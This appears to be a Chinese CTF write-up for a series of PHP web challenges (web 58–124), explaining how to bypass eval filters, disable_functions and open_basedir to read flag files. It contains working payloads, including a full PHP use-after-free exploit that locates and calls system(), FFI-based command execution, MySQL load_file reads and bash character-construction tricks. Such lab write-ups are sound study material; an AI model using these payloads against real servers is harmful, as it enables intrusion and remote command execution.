如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。

经过测试它在后端开启了disable_functions禁用了system exec popen passthru

## 二.解题思路：

使用读文件函数拿flag

```plaintext
file_get_contents()
highlight_file()
show_source()
fgets()
file()
readfile()
```

构造playload：

```plaintext
c=show_source('flag.php');
```

# web 59

```php
 <?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码:

过滤了更多的函数

但是还可以用

```plaintext
highlight_file()
show_source()
fgets()
file()
```

## 二.解题思路：

playload:

```plaintext
c=show_source("flag.php");
```

其他payload

```plaintext
//在源代码
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
c=$a=fopen("flag.php","r");while (!feof($a)) {$line =fgetcsv($a);print_r($line);}
c=$a=fopen("flag.php","r");echo fread($a,"1000");
c=$a=fopen("flag.php","r");echo fpassthru($a);
```

# web 60

```plaintext
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码:

同时也是过滤了函数

## 二.解题思路：

Web58 payload 通杀

```php
c=show_source("flag.php");
```

奇淫技巧：

```plaintext
#通过复制，重命名读取php文件内容  
copy("flag.php","flag.txt");         
rename("flag.php","flag.txt");
#访问flag.txt 
```

# web 61-65

```plaintext
 <?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码:

禁用某些函数，但是并不影响show_source

## 二.解题思路：

Web58和Web60 payload 通杀

```php
c=show_source("flag.php");
```

# web 66-67

```php
<?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码:

flag的位置变到了根目录

show_source()函数被禁用了换成highlight_file()

## 二.解题思路：

```plaintext
c=print_r(scandir("/")); #查看根目录文件 print_r被过滤可以换var_dump
# 注意根目录是flag.txt
c=highlight_file("/flag.txt");
```

# web 68

## 一.分析代码:

读文件的所有函数都不能用了

## 二.解题思路：

```plaintext
c=var_dump(scandir("/")); # flag还是在根目录下
# 利用文件包含inculde()读取flag
c=include("/flag.txt");
```

# web 69-70:

## 一.分析代码:

var_dump()函数被ban，那就用var_export()函数

## 二.解题思路：

### 方法一：

```plaintext
c=var_export(scandir('/'));
c=include('/flag.txt');
```

### 方法二：

使用遍历数组

```plaintext
# 多种遍历数组姿势
# 1
c=$a=scandir("/");foreach($a as $value){echo $value."---";}
# 2 glob() 函数返回匹配指定模式的文件名或目录。返回的是数组
c=$a=glob("/*");foreach($a as $value){echo $value."   ";}
# 3 
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```

```plaintext
c=include("/flag.txt");
```

# web 71

```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

## 一.分析代码:

```plaintext
$s = ob_get_contents();//得到缓冲区的数据。
ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容
```

## 二.解题思路：

`c=var_export(scandir('/'));`发现输出的一大堆问号，原来是源码中用函数将缓冲区的所有字符全部替换为问号，那么可以用`exit()/die()`提前结束，这样就不会将字符替换为问号

由于清空输出缓冲区 传入的命令也就无法执行 这里要做的就是把代码终止在清空输出缓冲区之前使用exit()强制退出

```plaintext
c=var_export(scandir('/'));exit();
# flag.txt 在根目录下
c=include('/flag.txt');exit();
```

# web 72

```php
<?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

## 一.分析代码:

存在open_basedir，利用glob伪协议在筛选目录时不受open_basedir制约

## 二.解题思路：

注：POST不会自动进行URL编码，需手动使用URL编码

```plaintext
c=
$a=new DirectoryIterator("glob:///*");
foreach($a as $f){
echo $f."    " ;
}
 
exit();
```

关于DirectoryIterator：<https://www.ziruchu.com/art/286>

知道了文件是/flag0.txt之后，就要想办法绕过open_basedir和disable_functions来读了。

```plaintext
c=?><?php
pwn("ls /;cat /flag0.txt");
 
function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
 
    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
 
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf('%c',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
 
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf('%c',$v & 0xff);
            $v >>= 8;
        }
    }
 
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
 
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
 
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
 
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
 
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
 
        if(!$data_addr || !$text_size || !$data_size)
            return false;
 
        return [$data_addr, $text_size, $data_size];
    }
 
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
 
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
 
            return $data_addr + $i * 8;
        }
    }
 
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
 
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
 
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
 
    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
 
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
 
    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
 
    $helper = new Helper;
    $helper->b = function ($x) { };
 
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
 
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
 
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
 
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
 
    $closure_obj = str2ptr($abc, 0x20);
 
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
 
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
 
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
 
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
 
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
 
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
 
    ($helper->b)($cmd);
    exit();
}
```

需要在burp中编码后发送

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-02175556.png)

# web 73-74

## 一.分析代码:

glob协议遍历出文件

## 二.解题思路：

### 方法一：

```plaintext
c=var_export(scandir('/'));exit(); //发现根目录下有flagc.txt
c=include('/flagc.txt');exit();
```

注：74为flagx.txt

### 方法二：

可以利用数组遍历的方法输出根目录下的所有文件

```plaintext
c=?><?php    //前面的?>用来闭合<?
	$a=new DirectoryIterator("glob:///*");   //php使用glob遍历文件夹
	foreach($a as $f) 
	{
		echo($f->__toString().' ');
	} 
	exit(0);
?>
```

# web 75-76

## 一.分析代码:

这次过滤的更多了，连include也被过滤了

## 二.解题思路：

```plaintext
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-
>__toString().'');}exit(0);?>
```

读到根目录下的flag36.txt。

#通过payload扫描 flag36.txt

```plaintext
c=
 
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
        'root');
 
    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
        echo ($row[0]) . "|";
    }
    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);
```

数据库的连接是读配置文件得到的  
 SQL语句来读文件绕过open_basedir和disable_function

# web 77

## 一.分析代码:

这题在题干中说到php7.4，可以想到[FFI](https://php.p2hp.com/manual/zh/ffi.cdef.php)

```plaintext
FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。
```

通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag

## 二.解题思路：

payload:

**第一种：**

```plaintext
//首先是熟悉的确定flag位置和名称
c=?><?php 
	$a=new DirectoryIterator("glob:///*"); 
	foreach($a as $f) 
	{ 
		echo($f->__toString().'  ');
	} 
	exit();
?>
//FFI调用system函数
c=
$ffi=FFI :: cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
exit();
```

**第二种：**

```plaintext
c=
$a=new DirectoryIterator("glob:///*");
foreach($a as $f){
echo $f."    " ;
}

$ffi = FFI::cdef(
    "int system(const char *command);");

$ffi->system("/readflag > 1.txt");

exit();
```

第二种之后要访问1.txt

# web 118

## 一.分析代码:

**事先了解一下：**  
 [Linux 基础知识：Bash的内置变量](https://blog.51cto.com/allenh/1695810)  
 [常见 Bash 内置变量介绍](https://www.cnblogs.com/sparkdev/p/9934595.html#title_0)

```plaintext
root@baba:~# echo ${PWD}
/root
root@baba:~# echo ${PWD:1:1}   //表示从第2（1+1）个字符开始的一个字符
r
root@baba:~# echo ${PWD:0:1}   //表示从第1（0+1）个字符开始的一个字符
/
root@baba:~# echo ${PWD:~0:1}  //表示从最后一个字符开始的一个字符
t
root@baba:~# echo ${PWD:~A}    //字母代表0
t
```

## 二.解题思路：

`所以可以利用各个环境变量的最后一位来构造命令。 ${PWD}在这题肯定是/var/www/html，而${PATH}通常是bin,那么${PWD:~A}的结果就应该是’ l ‘，因为${PATH:~A}的结果是’ n '，那么他们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php`

临时写的fuzz脚本，上脚本：

```python
import requests
import string

url = "http://187ad318-8353-4d22-8adf-e39767820f98.challenge.ctf.show/"

list = string.ascii_letters+string.digits+"$+-}{_><:?*.~/\\ "

white_list = ""

for payload in list:

    data = {
        "code" : payload
    }

    res = requests.post(url, data=data)

    if "evil input" not in res.text:
        print(payload)
        white_list += payload

print(white_list.replace(" ","空格"))
```

扫一下，白名单为 `ABCDEFGHIJKLMNOPQRSTUVWXYZ$}{_:?.~空格`

payload：

```plaintext
${PATH:~A}${PWD:~A} ????.???
```

具体解释：<https://www.cnblogs.com/knight-errant-dr/p/16377935.html>

# web 119-120

## 一.分析代码:

比上题多过滤了path

## 二.解题思路：

### 方法一：

可以构造出`/bin/base64 flag.php`，只需要/和4两个字符就行，其他的可以用通配符代替。  
 /很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的`` ${#SHLVL}`绕过
**SHLVL**
`是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。`
只需要`${PWD::${SHLVL}} ``，结果就是/

**RANDOM**  
 `此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。`

4的问题，可以用```` ${#RANDOM}`，在Linux中，`${#xxx}`显示的是这个值的位数`不加#是变量的值，加了#是变量的值的长度`，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.
payload：

```plaintext
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
```

### 方式二：

```plaintext
可以构造/bin/cat flag.php,需要t和/，${HOME}默认是/root，所以需要得到他的最后一个字母,容器的hostname应该是5个字母，所以${#HOSTNAME}可以从第5位开始，1还是用${#SHLVL}代替
```

payload：
`code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.??? ````

查看源码即可得到flag

# web 121

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

## 一.分析代码:

`$#`  
 `$?`  
 这两个的值都为0  
 加上#代表长度就为1  
 这题最关键的SHLVL被过滤了，可以用`` ${##}或${#?}`代替
## 二.解题思路：
` code=${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
code=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???`
hint中的payload
` code=${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.??? ``

使用的是/bin/rev读文件 把文件中每行逆序输出读取  
用到了IFS

```
定义字段分隔字符。默认值为：空格符、tab字符、换行字符(newline) 长度为3
```

PWD为 /var/www/html  
刚好第三个是r  
可以匹配到/bin/rev

# web 122

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

## 一. 解题思路：

这题在上题的基础上又过滤了#和PWD，PWD的绕过很简单，用HOME就可以，而#,就要用到`$?`了

```
$? 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)
```

所以在使用`$?`之前要先给错误的命令 让`$?`的值为1  
`${}和 <A可以但是题目上${}这个不可以`  
所以用`<A`后边的数字4还是用RANDOM随机数来获取

payload：

`code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???`

# web 124

```php
 <?php

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```

## 一.解题思路：

这道题给我们留了很多的数学函数，我们发现其中基本全是php中可用使用的函数。而且很多是可用进行进制转换的。我们来看下具体的函数

```plaintext
base_convert(number,frombase,tobase);
参数	描述
number	    必需。规定要转换的数。
frombase	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
tobase	    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。

bindec — 二进制转换为十进制
bindec ( string $binary_string ) : number

decbin — 十进制转换为二进制
decbin ( int $number ) : string

dechex — 十进制转换为十六进制
dechex ( int $number ) : string

decoct — 十进制转换为八进制
decoct ( int $number ) : string

hexdec — 十六进制转换为十进制
hexdec ( int $number ) : string
```

在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。  
假设我们要构造出如下表达式  
`c=$_GET[a]($_GET[b])&a=system&b=cat flag`  
我们需要构造的是其实只有 _GET，$我们可用使用，中括号可用花括号代替，小括号也是可以使用的。这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。  
那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。  
我们发现36进制中包含了所有的数字和字母，所有只需要将hex2bin按照36进制转换成10进制就可以了

```plaintext
echo base_convert('hex2bin', 36, 10);
结果  37907361743

echo hexdec(bin2hex("_GET"));
结果 1598506324
```

现在我们要做的就是反过来了

```plaintext
base_convert('37907361743',10,36);    hex2bin

base_convert('37907361743',10,36)(dechex('1598506324'));    _GET
```

```plaintext
c=$pi=_GET;$$pi{abs}($$pi{acos})&abs=system&acos=tac f*
```

我们再把_GET进行替换

```plaintext
payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=tac f*
```
